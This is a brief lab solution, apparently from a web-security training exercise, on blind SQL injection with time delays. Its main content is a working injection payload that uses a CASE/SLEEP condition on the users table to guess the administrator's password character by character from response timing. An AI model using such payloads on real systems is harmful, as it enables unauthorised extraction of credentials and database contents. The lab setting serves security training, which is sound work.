# Lab: Blind SQL injection with time delays and information retrieval

## Objective
Perform the attack to solve Blind SQL injection with time delays and information retrieval.

## Payload
```text
'+AND+(SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+SLEEP(10)+ELSE+NULL+END+FROM+users)--
```
